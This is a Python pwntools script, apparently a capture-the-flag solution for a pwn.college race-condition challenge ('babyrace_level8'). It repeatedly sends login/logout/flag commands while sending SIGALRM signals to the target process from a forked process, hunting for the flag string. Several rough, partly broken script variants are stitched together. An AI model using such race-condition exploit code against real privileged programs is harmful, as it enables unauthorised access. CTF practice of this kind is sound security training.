from pwn import *
import os


r = process('./babyrace_level8_testing1')
print('PID')
print(r.pid)
result = 0
# step 1
def step_1():
	r.sendline('login')
	r.sendline('logout')
	r.sendline('logout')
	r.sendline('flag')


# step 2
def step_2():
	os.kill(r.pid, 14)
	#r.sendline('flag')

# step 3
def step_3():
	r.sendline('flag')
	#os.kill(r.pid, 14)




#context.log_level = 'CRITICAL'
#p1 = os.fork()

if(os.fork() == 0):
	#os.close(os.open('/home/ctf/race/b', os.O_CREAT))
	print('Start')
	while(True):
		#print('Run')
		step_1()
		#step_2()
		#step_3()
		#r.clean()
		result = r.readall().decode()
		#print(result)
		#result = r.readall().decode()
		if('pwn_college{' in result):
			print('Found')
			print(result)
			break

# ________________________________________________-		
# First Script (only use this part here)
from pwn import *
import os
from time import sleep

r = process('./babyrace_level8_testing1')

print('PID')
# Use printed pid for second script
print(r.pid)




if(os.fork() == 0):
	# parent goes here
	while True:
		r.sendline('login logout flag ' *1000)
		result = r.clean().decode()
		if('pwn_college{' in result):
			print('Found')
			print(result)
			break
else:
	# child goes here
	while(True):
		os.kill(r.pid, 14)
		sleep(0.1)



#_______________________________________________--
# Second Script 
import os
from time import sleep
while(True):
	sleep(0.1)
	# rewrite r.pid with the printed pid from first script 
	os.kill(r.pid, 14)













"""

while True:
	with process(['/babyrace_level8_testing1', '/home/ctf/race/a/a']) as r:
		result = r.readall().decode()
		if('pwn_college{' in result):
			print(result)
			break

"""
"""
while(True):
	step_1()
	step_2()
	step_3()
	result = r.readall().decode()
	if('pwn_college{' in result):
			print(result)
			break


"""








# call forks here

while True:
	with process(['/babyrace_level8_testing1', '/home/ctf/race/a/a']) as r:
		result = r.readall().decode()
		if('pwn_college{' in result):
			print(result)
			break
